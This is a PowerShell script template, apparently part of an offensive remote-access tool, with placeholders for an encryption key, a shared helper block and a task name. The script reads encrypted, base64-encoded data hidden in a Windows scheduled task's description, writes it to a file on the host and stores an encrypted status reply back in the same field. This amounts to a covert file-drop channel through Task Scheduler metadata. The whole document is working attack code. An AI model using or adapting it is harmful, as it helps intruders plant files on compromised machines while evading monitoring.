$target_path = "REPLACE_FILE_PATH"
$taskPath = "\"
$encryptionKey = [System.Convert]::FromBase64String("{key_b64}")
{common_ps}
$scheduler = New-Object -ComObject Schedule.Service
$scheduler.Connect()
try {{
    $result = ""
    $folder = $scheduler.GetFolder($taskPath)
    $task = $folder.GetTask("{taskname}")
    $definition = $task.Definition
    if (Test-Path -Path $target_path) {{
        $result = "[-] File already exists."
    }}else{{
        try {{
            $description = $definition.RegistrationInfo.Description
            $decryptedDescription = Decrypt-Data $encryptionKey $description
            # base64 decode get raw data and save it to file
            $decodeData = ConvertFrom-Base64 $decryptedDescription
            # if target path not exists, create it
            $dir = Split-Path $target_path
            if (!(Test-Path -Path $dir)) {{
                New-Item -ItemType Directory -Path $dir
            }}
            $decodeData | Set-Content -Path "REPLACE_FILE_PATH" -Encoding Byte
            $result = "[+] Success."
        }} 
        catch {{
            $result = $_.Exception.Message
        }}
    }}
    $encryptedResult = Encrypt-Data $encryptionKey $result

    $definition.RegistrationInfo.Description = $encryptedResult
    $user = $task.Principal.UserId
    $folder.RegisterTaskDefinition($task.Name, $definition, 6, $user, $null, $task.Definition.Principal.LogonType)
}}catch {{
    Write-Error "Failed.."
}}
finally {{
    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($scheduler) | Out-Null
}}
[Environment]::Exit(0)